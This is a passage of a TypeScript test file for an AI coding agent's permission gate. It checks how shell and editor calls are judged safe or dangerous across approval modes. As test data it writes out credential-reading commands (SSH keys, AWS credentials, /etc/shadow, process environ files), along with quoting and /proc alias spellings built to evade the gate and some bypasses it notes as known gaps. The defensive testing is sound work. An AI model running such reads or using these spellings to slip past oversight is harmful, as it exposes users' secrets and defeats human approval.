/**
 * Permission approval modes: static risk rules and per-mode gate behavior.
 *
 * No model calls: the classifier is stubbed, so this covers the decision table
 * (default / auto / yolo), the whitelist rules, and every classifier failure
 * path — which must all land on "ask", never on silent approval.
 *
 * Run: pnpm tsx spike/verify-permission-modes.ts
 */
import { mkdtempSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';

import type { BeforeToolCallEvent } from '@strands-agents/sdk';

import {
  PermissionGate,
  assessRisk,
  classify,
  type AssessedPermissionRequest,
  type PermissionDecision,
  type PermissionGateOptions,
  type SafetyClassifier,
} from '../src/agent/permission.js';
import {
  isProcessEnvironPath,
  isSensitiveReadPath,
  isValidRule,
  matchesAnyRule,
  resolveReadTarget,
  sensitiveLocationBelow,
  sensitiveReadPath,
  suggestRules,
} from '../src/agent/permission-rules.js';
import { createHeadlessPermissionBridge } from '../src/headless.js';
import { isSensitiveDarwinPath } from '../src/paths.js';
import { assert, header, report } from './shared.js';

const ROOT = '/tmp/darwin-permission-modes';

function riskOf(toolName: string, input: unknown): { risk: string; riskReason: string } {
  return assessRisk(classify(toolName, input), ROOT);
}

function staticRules(): void {
  header('static risk rules — bash');

  const safeBash = [
    'git status',
    'git log --oneline -5',
    'ls -la src',
    'cat package.json | grep name',
    'rg PermissionGate src && echo found',
    // SER-053: read-only forms that carry arguments must stay safe.
    'ls -la',
    'cat README.md',
    'rg foo | head -5',
    'git branch --show-current',
    'git branch -a',
    'git branch --list',
    'git branch -avv',
    'git diff --stat',
    'git show HEAD --stat',
    "find . -name '*.ts'",
    'find . -type f -newer x',
    'find . -name "*.log" -print',
  ];
  for (const command of safeBash) {
    assert(`safe: ${command}`, riskOf('bash', { command }).risk === 'safe');
  }

  const dangerousBash = [
    ['git push origin main', 'non-read-only git'],
    ['ls && rm -rf /tmp/x', 'chained write'],
    ['echo hi > file', 'redirection'],
    ['cat $(find . -name secret)', 'substitution'],
    ['ls `whoami`', 'backticks'],
    ['pnpm typecheck', 'not allowlisted'],
    ['', 'empty command'],
  ] as const;
  for (const [command, why] of dangerousBash) {
    assert(`dangerous (${why}): ${command || '(empty)'}`, riskOf('bash', { command }).risk === 'dangerous');
  }

  header('static risk rules — mutating arguments of whitelisted commands (SER-053)');

  // [command, option the reason must name]
  const mutatingArgs = [
    ['find . -name "*.tmp" -delete', '-delete'],
    ['find . -name "*.log" -exec rm {} \\;', '-exec'],
    ['find . -execdir rm {} +', '-execdir'],
    ['find . -ok rm {} \\;', '-ok'],
    ['find . -okdir rm {} \\;', '-okdir'],
    ['find . -fprint /tmp/list', '-fprint'],
    ['find . -fprint0 /tmp/list', '-fprint0'],
    ['find . -fprintf /tmp/list %p', '-fprintf'],
    ['find . -fls /tmp/list', '-fls'],
    ['git branch -D main', '-D'],
    ['git branch -d feature', '-d'],
    ['git branch -m main old', '-m'],
    ['git branch -M main', '-M'],
    ['git branch -c a b', '-c'],
    ['git branch -C a b', '-C'],
    ['git branch -u origin/main', '-u'],
    ['git branch -Df main', '-D'],
    ['git branch -fD main', '-D'],
    ['git branch --set-upstream-to origin/main', '--set-upstream-to'],
    ['git branch --set-upstream-to=origin/main', '--set-upstream-to'],
    ['git branch --unset-upstream', '--unset-upstream'],
    ['git branch --edit-description', '--edit-description'],
    ['git branch --delete feature', '--delete'],
    ['git branch --move a b', '--move'],
    ['git branch --copy a b', '--copy'],
    ['git diff --output=/tmp/x.patch', '--output'],
    ['git diff --output /tmp/x.patch', '--output'],
    ['git log --output=/tmp/log.txt', '--output'],
    ['git show --output=/tmp/s.txt HEAD', '--output'],
    // The argument rule is applied per segment.
    ['ls | find . -delete', '-delete'],
    ['git status && git branch -D main', '-D'],
  ] as const;
  for (const [command, option] of mutatingArgs) {
    const verdict = riskOf('bash', { command });
    assert(
      `dangerous, reason names ${option}: ${command}`,
      verdict.risk === 'dangerous' && verdict.riskReason.includes(`\`${option}\``),
    );
  }

  assert('bash restart is safe (read kind)', riskOf('bash', { mode: 'restart' }).risk === 'safe');

  header('static risk rules — fileEditor');

  const edit = (path: string) => riskOf('fileEditor', { command: 'str_replace', path, old_str: 'a', new_str: 'b' });

  assert('in-project write is safe', edit(`${ROOT}/src/index.ts`).risk === 'safe');
  assert('relative in-project write is safe', edit('src/index.ts').risk === 'safe');
  assert('view is safe anywhere', riskOf('fileEditor', { command: 'view', path: '/etc/passwd' }).risk === 'safe');
  assert('write outside project is dangerous', edit('/etc/passwd').risk === 'dangerous');
  assert('.. escape is dangerous', edit(`${ROOT}/../other/file`).risk === 'dangerous');
  assert('.git internals are dangerous', edit(`${ROOT}/.git/config`).risk === 'dangerous');
  assert('.env is dangerous', edit(`${ROOT}/.env`).risk === 'dangerous');
  assert('.env.local is dangerous', edit(`${ROOT}/.env.local`).risk === 'dangerous');
  assert('.darwin/config.json is dangerous', edit(`${ROOT}/.darwin/config.json`).risk === 'dangerous');
  assert('.darwin hook directory writes are dangerous', edit(`${ROOT}/.darwin/hooks/policy.json`).risk === 'dangerous');
  assert('.agents hook directory writes are dangerous', edit(`${ROOT}/.agents/hooks/policy.json`).risk === 'dangerous');
  const home = os.homedir();
  assert('global .darwin hook directory writes are sensitive',
    isSensitiveDarwinPath(ROOT, path.join(home, '.darwin', 'hooks', 'policy.json')));
  assert('global .agents hook directory writes are sensitive',
    isSensitiveDarwinPath(ROOT, path.join(home, '.agents', 'hooks', 'policy.json')));

  header('static risk rules — other tools');

  assert('load_skill is safe', riskOf('load_skill', { name: 'x' }).risk === 'safe');
  const ordinaryImage = riskOf('imageViewer', { path: 'screenshots/error.png' });
  assert(
    'imageViewer is safe',
    ordinaryImage.risk === 'safe' && ordinaryImage.riskReason === 'imageViewer is read-only',
  );
  const imageRequest = classify('imageViewer', { path: 'screenshots/error.png\nspoofed summary' });
  assert(
    'imageViewer permission summary remains one line',
    imageRequest.kind === 'read' && !imageRequest.summary.includes('\n'),
  );
  assert('subagent delegation is safe', riskOf('subagent', { task: 'inspect', agent: 'general' }).risk === 'safe');
  assert(
    'unknown / MCP tools are dangerous',
    riskOf('mcp__server__do_thing', { arg: 1 }).risk === 'dangerous',
  );
  assert('memory_recall is a statically safe local read', riskOf('memory_recall', { query: 'architecture' }).risk === 'safe');
  assert('memory_save is an ordinary dangerous write', riskOf('memory_save', { key: 'decision:x', category: 'decision', title: 'x' }).risk === 'dangerous');
  const memoryRequest = classify('memory_save', {
    key: 'decision:x', category: 'decision', title: 'Bounded title', fact: 'secret fact body',
    evidence: { path: 'AGENTS.md', quote: 'sensitive evidence quote' },
  });
  assert('memory save permission presentation omits fact and quote text',
    !JSON.stringify({ summary: memoryRequest.summary, details: memoryRequest.details }).includes('secret fact body') &&
    !JSON.stringify({ summary: memoryRequest.summary, details: memoryRequest.details }).includes('sensitive evidence quote'));
  assert('memory save can never match or suggest an allow rule',
    matchesAnyRule(['memory_save'], memoryRequest, ROOT) === undefined && suggestRules(memoryRequest, ROOT).length === 0);
}

/**
 * Sensitive-path reads are never silent (SER-071): the fixed set, every spelling
 * the model may use, and the near-misses that must stay exactly as safe as before.
 */
function sensitiveReads(): void {
  header('static risk rules — sensitive-path reads (SER-071)');

  const home = os.homedir();
  const view = (filePath: string) => riskOf('fileEditor', { command: 'view', path: filePath });
  const bash = (command: string) => riskOf('bash', { command });

  // [path as the model would write it, why it is in the set]
  const sensitivePaths = [
    ['~/.ssh/id_rsa', '~/.ssh'],
    ['~/.aws/credentials', '~/.aws'],
    ['~/.gnupg/secring.gpg', '~/.gnupg'],
    ['~/.netrc', '~/.netrc'],
    ['~/.kube/config', '~/.kube/config'],
    ['~/.docker/config.json', '~/.docker/config.json'],
    ['/etc/shadow', '/etc/shadow'],
    ['.env', '.env basename'],
    [`${ROOT}/config/.env.production`, '.env.* basename anywhere'],
    ['~/.darwin/config.json', "darwin's own config"],
    [`${ROOT}/.darwin/hooks/policy.json`, 'project hook policy'],
  ] as const;
  for (const [filePath, why] of sensitivePaths) {
    const viewed = view(filePath);
    assert(
      `fileEditor view is dangerous and names the path (${why}): ${filePath}`,
      viewed.risk === 'dangerous' && viewed.riskReason === `reads a sensitive path: ${filePath}`,
    );
    const request = classify('fileEditor', { command: 'view', path: filePath });
    assert(`fileEditor view keeps kind read: ${filePath}`, request.kind === 'read');
  }

  // Every whitelisted reader, in every spelling of the home directory.
  const readers = ['cat', 'head', 'tail', 'grep -n password', 'rg password', 'ls -la', 'find', 'wc -l'];
  const spellings = ['~/.ssh/id_rsa', '$HOME/.ssh/id_rsa', '${HOME}/.ssh/id_rsa', `${home}/.ssh/id_rsa`];
  for (const reader of readers) {
    for (const spelling of spellings) {
      const command = `${reader} ${spelling}`;
      const assessed = bash(command);
      assert(
        `bash reader is dangerous and names the path: ${command}`,
        assessed.risk === 'dangerous' && assessed.riskReason === `reads a sensitive path: ${spelling}`,
      );
    }
  }
  assert('a bare ~ directory listing of ~/.ssh is dangerous', bash('ls ~/.ssh').riskReason === 'reads a sensitive path: ~/.ssh');
  assert('$HOME alone resolves to the home directory, which is not in the set', bash('ls $HOME').risk === 'safe');
  assert(
    'a ..-escaping relative form reaches the home set',
    bash(`cat ${path.relative(ROOT, path.join(home, '.aws', 'credentials'))}`).risk === 'dangerous',
  );
  assert(
    'a ..-escaping relative fileEditor view reaches the home set',
    view(`../${path.relative(path.dirname(ROOT), path.join(home, '.ssh', 'id_rsa'))}`).risk === 'dangerous',
  );
  assert('a quoted path still counts', bash('cat "$HOME/.aws/credentials"').risk === 'dangerous');
  assert('the sensitive segment of a chain is found', bash('ls src && cat ~/.netrc').riskReason === 'reads a sensitive path: ~/.netrc');
  assert('the first sensitive argument is the one named', bash('cat README.md ~/.ssh/id_rsa').riskReason === 'reads a sensitive path: ~/.ssh/id_rsa');
  assert('the set is exported as a predicate', isSensitiveReadPath(ROOT, path.join(home, '.ssh', 'known_hosts')) && !isSensitiveReadPath(ROOT, home));
  assert('the pure function returns the path as written', sensitiveReadPath('bash', { command: 'head -5 ~/.aws/config' }, ROOT) === '~/.aws/config');
  assert('resolveReadTarget expands ${HOME}', resolveReadTarget('${HOME}/.ssh', ROOT) === path.join(home, '.ssh'));
  assert('resolveReadTarget normalises ..', resolveReadTarget('~/.ssh/../.aws/credentials', ROOT) === path.join(home, '.aws', 'credentials'));

  header('static risk rules — grep/rg searching above a credential location (SER-071)');

  // [command, the argument and location the reason must name]
  const ancestorSearches = [
    ['grep -r AKIA ~', '~ (searches above ~/.ssh)'],
    [`grep -r x ${home}`, `${home} (searches above ~/.ssh)`],
    ['rg --hidden s ~', '~ (searches above ~/.ssh)'],
    ['rg -uu p /', '/ (searches above ~/.ssh)'],
    ['grep -r k /etc', '/etc (searches above /etc/shadow)'],
    ['rg token ~/.kube', '~/.kube (searches above ~/.kube/config)'],
    ['grep -r auth $HOME/.docker', '$HOME/.docker (searches above ~/.docker/config.json)'],
  ] as const;
  for (const [command, named] of ancestorSearches) {
    const assessed = bash(command);
    assert(`dangerous, names the location: ${command}`, assessed.risk === 'dangerous' && assessed.riskReason === `reads a sensitive path: ${named}`);
  }
  assert('sensitiveLocationBelow abbreviates the home directory', sensitiveLocationBelow(home) === '~/.ssh' && sensitiveLocationBelow('/etc') === '/etc/shadow');
  assert('sensitiveLocationBelow ignores unrelated trees', sensitiveLocationBelow('/usr/share') === undefined && sensitiveLocationBelow(path.join(home, 'src')) === undefined);

  // Only the two recursive content readers: name-only and single-file readers
  // starting at an ancestor stay exactly as safe as before.
  for (const command of ['ls -R ~', 'find ~ -name id_rsa', 'cat /etc', 'wc -l ~', 'head ~', 'tail /']) {
    const assessed = bash(command);
    assert(`ancestor rule does not apply: ${command}`, assessed.risk === 'safe' && assessed.riskReason === 'read-only command');
  }
  // `/tmp` is deliberately absent from the fixed list: `spike/run-tests.ts` gives
  // every suite a private HOME under `os.tmpdir()`, where `/tmp` really is an
  // ancestor of `~/.ssh` — so it is asserted relative to the home in force.
  for (const command of ['rg secret src/', 'grep -r foo .', 'rg foo /var/log', 'grep -r foo /usr/share', 'rg -n pattern src/agent']) {
    const assessed = bash(command);
    assert(`safe, reason unchanged: ${command}`, assessed.risk === 'safe' && assessed.riskReason === 'read-only command');
  }
  const tmpSearch = bash('rg foo /tmp');
  assert(
    'rg foo /tmp is judged by whether /tmp is above the home in force',
    sensitiveLocationBelow('/tmp') === undefined
      ? tmpSearch.risk === 'safe' && tmpSearch.riskReason === 'read-only command'
      : tmpSearch.riskReason === 'reads a sensitive path: /tmp (searches above ~/.ssh)',
  );
  // `.env*` is deliberately outside the ancestor rule: a project root that holds
  // a real `.env` still searches silently.
  const envProject = mkdtempSync(path.join(os.tmpdir(), 'darwin-ser071-env-'));
  writeFileSync(path.join(envProject, '.env'), 'SECRET=1\n');
  for (const command of ['grep -r foo .', `rg foo ${envProject}`, 'grep -rn TODO src']) {
    const assessed = assessRisk(classify('bash', { command }), envProject);
    assert(`a project with .env still searches silently: ${command}`, assessed.risk === 'safe' && assessed.riskReason === 'read-only command');
  }
  assert('naming the .env itself still prompts in that project',
    assessRisk(classify('bash', { command: 'grep SECRET .env' }), envProject).riskReason === 'reads a sensitive path: .env');

  header('static risk rules — near misses stay safe with unchanged reasons (SER-071)');

  const safeReads = [
    'cat README.md',
    'ls ~/.ssh/../',
    'ls ~',
    'cat .envrc',
    'cat src/environment.ts',
    'rg secret src/',
    'rg password ~/.gnupg/../notes',
    'find . -name "*.ts"',
    'wc -l src/cli.ts',
    // `echo` prints its arguments and, with `<`/`$(` refused, can open no file.
    'echo ~/.ssh/id_rsa',
    // `pwd`/`which` take no paths. `git log` names history, not a blob pathspec
    // (SER-119 keeps this exact command a read-only command).
    'which cat ~/.ssh/id_rsa',
    'git log -- ~/.ssh/id_rsa',
  ];
  for (const command of safeReads) {
    const assessed = bash(command);
    assert(`safe, reason unchanged: ${command}`, assessed.risk === 'safe' && assessed.riskReason === 'read-only command');
  }
  for (const filePath of ['src/cli.ts', `${ROOT}/README.md`, `${home}/.ssh/../notes.txt`, '.envrc', 'src/environment.ts', '/etc/os-release', '/tmp/scratch.txt']) {
    const viewed = view(filePath);
    assert(`fileEditor view safe, reason unchanged: ${filePath}`, viewed.risk === 'safe' && viewed.riskReason === 'fileEditor is read-only');
  }
  assert('an unrelated dangerous reason is unchanged', bash('pnpm typecheck').riskReason === '`pnpm` is not on the safe-command list');
  assert('a write to a sensitive read path keeps its write reason',
    riskOf('fileEditor', { command: 'create', path: `${ROOT}/.env`, file_text: 'x' }).riskReason === 'path is an environment file');
  assert('sensitiveReadPath ignores non-view fileEditor commands',
    sensitiveReadPath('fileEditor', { command: 'create', path: '~/.ssh/id_rsa' }, ROOT) === undefined);
  assert('sensitiveReadPath ignores tools it cannot see into', sensitiveReadPath('mcp__server__read', { path: '~/.ssh/id_rsa' }, ROOT) === undefined);

  header('static risk rules — process environments are sensitive reads (SER-109)');

  // [call, the path the reason must name]. The probe commands from the
  // SER-109 evidence first: each returned `safe | read-only command` before.
  const environReads: Array<[string, unknown, string]> = [
    ['bash', { command: 'cat /proc/$PPID/environ' }, '/proc/$PPID/environ'],
    ['bash', { command: 'head -c 4000 /proc/$PPID/environ' }, '/proc/$PPID/environ'],
    ['bash', { command: 'grep -a KEY /proc/$PPID/environ' }, '/proc/$PPID/environ'],
    ['bash', { command: 'cat /proc/*/environ' }, '/proc/*/environ'],
    ['bash', { command: 'cat /proc/1/environ' }, '/proc/1/environ'],
    ['bash', { command: 'cat /proc/self/environ' }, '/proc/self/environ'],
    ['fileEditor', { command: 'view', path: '/proc/12345/environ' }, '/proc/12345/environ'],
    ['bash', { command: 'cat /proc/thread-self/environ' }, '/proc/thread-self/environ'],
    ['bash', { command: 'cat /proc/1/task/1/environ' }, '/proc/1/task/1/environ'],
    ['bash', { command: "cat '/proc/${PPID}/environ'" }, "'/proc/${PPID}/environ'"],
    ['bash', { command: 'head /proc/[0-9]*/environ' }, '/proc/[0-9]*/environ'],
    // Further spellings the same predicate covers.
    ['bash', { command: 'cat /proc/${PPID}/environ' }, '/proc/${PPID}/environ'],
    ['bash', { command: 'cat /proc/$$/environ' }, '/proc/$$/environ'],
    ['bash', { command: 'tail /proc/?/environ' }, '/proc/?/environ'],
    ['bash', { command: 'cat /proc/*/task/*/environ' }, '/proc/*/task/*/environ'],
    ['bash', { command: 'cat /proc/self/env*' }, '/proc/self/env*'],
    ['bash', { command: 'cat /proc/1/e?viron' }, '/proc/1/e?viron'],
    ['bash', { command: 'cat /proc/1/{cmdline,environ}' }, '/proc/1/{cmdline,environ}'],
    ['bash', { command: 'cat /proc/1/"environ"' }, '/proc/1/"environ"'],
    ['bash', { command: 'cat /proc/1/*' }, '/proc/1/*'],
    ['bash', { command: 'cat /*/1/environ' }, '/*/1/environ'],
    ['bash', { command: 'cat //proc/1/environ' }, '//proc/1/environ'],
    ['bash', { command: 'cat /proc/self/root/proc/1/environ' }, '/proc/self/root/proc/1/environ'],
    ['bash', { command: 'wc -c /proc/1/environ' }, '/proc/1/environ'],
    ['bash', { command: 'ls src && cat /proc/$PPID/environ' }, '/proc/$PPID/environ'],
    ['fileEditor', { command: 'view', path: '/proc/self/environ' }, '/proc/self/environ'],
    // Recursive content readers starting above a process environment.
    ['bash', { command: 'grep -ra KEY /proc/self' }, '/proc/self (searches above /proc/<pid>/environ)'],
    ['bash', { command: 'grep -r KEY /proc' }, '/proc (searches above /proc/<pid>/environ)'],
    ['bash', { command: 'rg -a KEY /proc/1/task' }, '/proc/1/task (searches above /proc/<pid>/environ)'],
  ];
  for (const [toolName, input, named] of environReads) {
    const assessed = assessRisk(classify(toolName, input), ROOT);
    const label = `${toolName} ${JSON.stringify(input)}`;
    assert(`dangerous, names the path: ${label}`, assessed.risk === 'dangerous' && assessed.riskReason === `reads a sensitive path: ${named}`);
    assert(`no allow rule offered or matching: ${label}`,
      suggestRules({ toolName, input }, ROOT).length === 0 && matchesAnyRule([toolName, `${toolName}:*`, 'bash:cat *', 'fileEditor:**'], { toolName, input }, ROOT) === undefined);
  }
  assert('a ..-escaping relative path reaches /proc', bash(`cat ${path.relative(ROOT, '/proc/1/environ')}`).risk === 'dangerous');
  // Stated gap: relative forms resolve against the project root, never a cwd a
  // prior `cd /proc` left behind, so this one is judged as `<root>/1/environ`.
  assert('a relative form below a cd is resolved against the project root (stated gap)',
    bash('cat 1/environ').risk === 'safe' && bash('cat 1/environ').riskReason === 'read-only command');
  assert('isProcessEnvironPath is exported and literal-path narrow',
    isProcessEnvironPath('/proc/1/environ') && !isProcessEnvironPath('/proc/environ') && !isProcessEnvironPath('/proc/1/cmdline')
      && !isProcessEnvironPath(`${ROOT}/proc/1/environ`));

  // Readers already dangerous for another reason keep that reason.
  assert('strings keeps its own reason', bash('strings /proc/1/environ').riskReason === '`strings` is not on the safe-command list');
  assert('a redirect keeps its own reason', bash('tr "\\0" "\\n" < /proc/1/environ').riskReason === 'command uses redirection or substitution');

  // Every other /proc read, and the ordinary reads, keep their prior verdicts.
  for (const command of [
    'cat /proc/cpuinfo',
    'cat /proc/meminfo',
    'cat /proc/$PPID/cmdline',
    'cat /proc/self/status',
    'head /proc/1/cmdline',
    'ls /proc',
    'ls /proc/self',
    'find /proc/1 -maxdepth 1',
    'cat /proc/1/c*',
    'cat src/cli.ts',
    'rg secret src/',
    'cat src/environ',
    'grep -r foo /proc/1/cwd',
    'rg foo /proc/sys',
  ]) {
    const assessed = bash(command);
    assert(`safe, reason unchanged: ${command}`, assessed.risk === 'safe' && assessed.riskReason === 'read-only command');
  }
  for (const filePath of ['/proc/cpuinfo', '/proc/12345/cmdline', `${ROOT}/environ`]) {
    const viewed = view(filePath);
    assert(`fileEditor view safe, reason unchanged: ${filePath}`, viewed.risk === 'safe' && viewed.riskReason === 'fileEditor is read-only');
  }
}

/** Classification fixtures only: never open a credential or any proc entry. */
function aliasedReadCases(): Array<[string, unknown, string]> {
  const home = os.homedir();
  const bashPaths = [
    '~/".ssh"/id_rsa', "~/'.aws'/credentials",
    '$HOME/".gnupg"/secring.gpg', '${HOME}/".darwin"/config.json',
    '"~"/".ssh"/id_rsa', `${home}/'.ssh'/id_rsa`,
    '/etc/"shadow"', '".env"', "config/'.env.production'", '".en"v.local',
    '~/notes/../".ssh"/id_rsa', '~/".ssh"/../".aws"/credentials',
    `/proc/self/root${home}/.ssh/id_rsa`, `/proc/self/root${home}/.darwin/config.json`,
    `/proc/self/root${ROOT}/.darwin/hooks/policy.json`,
    '/proc/self/root/etc/shadow', '/proc/self/root/../etc/shadow',
    '/proc/self/root/proc/thread-self/root/etc/shadow',
    '/proc/self/root/proc/thread-self/cwd/../.ssh/id_rsa',
    `${path.relative(ROOT, '/proc/self/root')}/etc/shadow`,
    `${path.relative(ROOT, '/proc/self/cwd')}/../.ssh/id_rsa`,
    // SER-109's broad final-environ rule must not be narrowed by re-rooting.
    '/proc/self/root/somewhere/environ',
    '/proc/self/cwd/.ssh/id_rsa', '/proc/self/cwd/.aws', '/proc/self/cwd/.gnupg/key',
    '/proc/self/cwd/.netrc', '/proc/self/cwd/.kube/config', '/proc/self/cwd/.docker/config.json',
    '/proc/self/cwd/.darwin/config.json', '/proc/self/cwd/.agents/hooks.json',
    '/proc/self/cwd/hooks/policy.json', '/proc/self/cwd/agentcore/authorization.json',
    '/proc/self/cwd/config.json', '/proc/self/cwd/permission-rules.json', '/proc/self/cwd/shadow',
    '/proc/self/cwd/.env', '/proc/self/cwd/config/.env.production', '/proc/self/cwd/".env.local"',
    '/proc/self/cwd/../.ssh/id_rsa', '/proc/self/cwd/../../.netrc',
    '/proc/self/cwd/*/credentials', '/proc/self/cwd/$TARGET',
    '/proc/self/cwd/.a?s/credentials', '/proc/self/cwd/{notes,.ssh}/key',
  ];
  const calls: Array<[string, unknown, string]> = bashPaths.map((filePath) => ['bash', { command: `cat ${filePath}` }, filePath]);
  for (const pid of ['self', 'thread-self', '1', '12345', '$PPID', '${PPID}', '$$', '*', '[0-9]*', '?', '{1,self}']) {
    for (const filePath of [`/proc/${pid}/root${home}/.aws/credentials`, `/proc/${pid}/cwd/.ssh/id_rsa`]) {
      calls.push(['bash', { command: `head ${filePath}` }, filePath]);
    }
  }
  for (const filePath of [
    '/proc/self/root/etc/shadow', `/proc/self/root${home}/.ssh/id_rsa`,
    `/proc/self/root${home}/.darwin/config.json`, '/proc/thread-self/cwd/.env.local',
    '/proc/12345/cwd/.aws/credentials', '/proc/self/cwd/../.ssh/id_rsa',
    '/proc/self/task/1/root/etc/shadow', '/proc/self/task/1/cwd/config.json',
  ]) calls.push(['fileEditor', { command: 'view', path: filePath }, filePath]);
  calls.push(['bash', { command: 'rg secret /proc/self/root/etc' }, '/proc/self/root/etc (searches above /etc/shadow)']);
  return calls;
}

function aliasedReads(): void {
  header('static risk rules — quote removal and proc root/cwd aliases (SER-112)');
  for (const [toolName, input, named] of aliasedReadCases()) {
    const request = classify(toolName, input);
    const assessed = assessRisk(request, ROOT);
    const label = `${toolName} ${JSON.stringify(input)}`;
    assert(`dangerous, original reason and flag: ${label}`,
      assessed.risk === 'dangerous' && assessed.riskReason === `reads a sensitive path: ${named}` && assessed.sensitiveRead === true);
    assert(`kind unchanged: ${label}`, request.kind === (toolName === 'bash' ? 'execute' : 'read'));
    assert(`no allow rule offered or matching: ${label}`,
      suggestRules(request, ROOT).length === 0 && matchesAnyRule([toolName, `${toolName}:*`, 'bash:cat *', 'fileEditor:**'], request, ROOT) === undefined);
  }
  for (const command of [
    'cat "src/cli.ts"', "cat '/etc/os-release'", 'ls /proc/self/root/tmp',
    'cat ~/".ssh"/../notes.txt', 'cat /etc/"shadow.bak"', 'cat ".envrc"', 'cat ".env."',
    'cat /proc/self/root/etc/os-release', 'cat /proc/self/root/tmp/.envrc',
    'cat /proc/self/cwd/src/cli.ts', 'cat /proc/self/cwd/README.md', 'cat /proc/self/cwd/.envrc',
    'cat /proc/self/cwd/.env.', 'cat /proc/self/cwd/.aws-backup/notes', 'cat /proc/self/cwd/shadow.bak',
    'cat /proc/self/cwd/config.yaml', 'cat /proc/self/cwd/notes/../src/cli.ts',
    'ls /proc/self/cwd', 'grep -r foo /proc/self/cwd',
    'cat /proc/sys/root/etc/shadow', 'cat /proc/self/rooted/etc/shadow', 'cat src/proc/self/cwd/.ssh/key',
  ]) {
    const assessed = riskOf('bash', { command });
    assert(`safe, exact old reason: ${command}`, assessed.risk === 'safe' && assessed.riskReason === 'read-only command');
  }
  for (const filePath of [
    '/proc/self/root/etc/os-release', '/proc/self/cwd/src/cli.ts', '/proc/self/cwd/.envrc',
    '~/".ssh"/id_rsa', '/etc/"shadow"', '".en"v.local', '/proc/self/cwd/".ssh"/key',
    '/proc/$PPID/root/etc/shadow', '/proc/*/root/etc/shadow',
  ]) {
    const assessed = riskOf('fileEditor', { command: 'view', path: filePath });
    assert(`fileEditor keeps literal embedded syntax: ${filePath}`,
      assessed.risk === 'safe' && assessed.riskReason === 'fileEditor is read-only');
  }
  assert('bash quote removal precedes home expansion and normalization',
    resolveReadTarget('"~"/".ssh"/../".aws"/credentials', ROOT, true) === path.join(os.homedir(), '.aws/credentials'));
  assert('fileEditor retains legacy outer-quote/home shorthand',
    resolveReadTarget('"~/.ssh/id_rsa"', ROOT) === path.join(os.homedir(), '.ssh/id_rsa'));
  // Honest boundaries: no effective cwd, nonleading variable expansion or arbitrary symlink resolution.
  for (const command of ['cat .ssh/id_rsa', 'cat /tmp/$HOME/.ssh/id_rsa', 'cat /proc/self/root/$H/.ssh/id_rsa', 'cat /proc/self/cwd/id_rsa']) {
    assert(`documented unmatched alias/cwd gap: ${command}`, riskOf('bash', { command }).risk === 'safe');
  }
}

/**
 * Minimal stand-in for the SDK event. The gate reads `toolUse` and the calling
 * agent's id (for provenance), and the real event always carries both.
 */
function fakeEvent(name: string, input: unknown, agentId = 'darwin'): BeforeToolCallEvent {
  return { toolUse: { name, input }, agent: { id: agentId } } as unknown as BeforeToolCallEvent;
}

interface GateRun {
  action: { type: string; reason?: string };
  asked: AssessedPermissionRequest[];
}

function actionReason(action: GateRun['action']): string {
  return action.reason ?? '';
}

async function runGate(
  options: Partial<PermissionGateOptions> & { mode: PermissionGateOptions['mode'] },
  toolName: string,
  input: unknown,
  answer: boolean | PermissionDecision = true,
  agentId = 'darwin',
): Promise<GateRun> {
  const asked: AssessedPermissionRequest[] = [];
  const gate = new PermissionGate({
    projectRoot: ROOT,
    ask: async (request) => {
      asked.push(request);
      return typeof answer === 'boolean' ? { allowed: answer } : answer;
    },
    ...options,
  });
  const action = (await gate.beforeToolCall(fakeEvent(toolName, input, agentId))) as GateRun['action'];
  return { action, asked };
}

const DANGEROUS_BASH = { command: 'rm -rf /tmp/x' };
const SAFE_BASH = { command: 'git status' };

async function gateModes(): Promise<void> {
  header('gate — default mode');

  let run = await runGate({ mode: 'default' }, 'bash', SAFE_BASH);
  assert('safe call proceeds without asking', run.action.type === 'proceed' && run.asked.length === 0);

  run = await runGate({ mode: 'default' }, 'bash', DANGEROUS_BASH, true);
  assert('dangerous call asks, approval proceeds', run.action.type === 'proceed' && run.asked.length === 1);

  run = await runGate({ mode: 'default' }, 'bash', DANGEROUS_BASH, false);
  assert('dangerous call asks, refusal denies', run.action.type === 'deny' && run.asked.length === 1);
  assert(
    'the prompt carried the risk reason',
    run.asked[0] !== undefined && run.asked[0].riskReason.length > 0,
  );

  header('gate — yolo mode');

  run = await runGate({ mode: 'yolo' }, 'bash', DANGEROUS_BASH);
  assert('dangerous call proceeds without asking', run.action.type === 'proceed' && run.asked.length === 0);

  run = await runGate({ mode: 'yolo' }, 'mcp__anything__at_all', {});
  assert('unknown tool proceeds without asking', run.action.type === 'proceed' && run.asked.length === 0);

  header('gate — plan mode');

  run = await runGate({ mode: 'plan' }, 'fileEditor', { command: 'view', path: `${ROOT}/src/index.ts` });
  assert('read-classified calls proceed without asking', run.action.type === 'proceed' && run.asked.length === 0);

  run = await runGate({ mode: 'plan' }, 'imageViewer', { path: 'screenshots/error.png' });
  assert('image reads proceed in plan/headless-safe flow', run.action.type === 'proceed' && run.asked.length === 0);

  run = await runGate(
    { mode: 'plan', allowRules: ['fileEditor'] },
    'fileEditor',
    { command: 'str_replace', path: `${ROOT}/src/index.ts`, old_str: 'a', new_str: 'b' },
  );
  assert('a statically safe write is denied before an allow rule', run.action.type === 'deny' && run.asked.length === 0);
  assert(
    'write denial is actionable and names plan mode',
    actionReason(run.action).includes('Plan mode blocked this write call') &&
      actionReason(run.action).includes('run outside plan mode'),
  );

  let planClassifierCalls = 0;
  const planClassifier: SafetyClassifier = async () => {
    planClassifierCalls += 1;
    return { safe: true, reason: 'approve everything' };
  };
  run = await runGate(
    { mode: 'plan', classifier: planClassifier, allowRules: ['bash'] },
    'bash',
    SAFE_BASH,
  );
  assert(
    'execute is denied before prompt, classifier, and broad allow rule',
    run.action.type === 'deny' && run.asked.length === 0 && planClassifierCalls === 0,
  );
  assert('execute denial identifies its kind and tool', actionReason(run.action).includes('execute call to bash'));

  run = await runGate(
    { mode: 'plan', allowRules: ['mcp__anything__at_all'] },
    'mcp__anything__at_all',
    {},
  );
  assert('unknown/MCP tools remain fail-closed as execute', run.action.type === 'deny' && run.asked.length === 0);

  header('gate — auto mode');

  const saysSafe: SafetyClassifier = async () => ({ safe: true, reason: 'harmless temp cleanup' });
  const saysUnsafe: SafetyClassifier = async () => ({ safe: false, reason: 'destructive delete' });
  const throws: SafetyClassifier = async () => {
    throw new Error('service down');
  };
  const hangs: SafetyClassifier = () => new Promise(() => undefined);

  run = await runGate({ mode: 'auto', classifier: saysSafe }, 'bash', SAFE_BASH);
  assert('statically safe call skips the classifier and proceeds', run.action.type === 'proceed' && run.asked.length === 0);

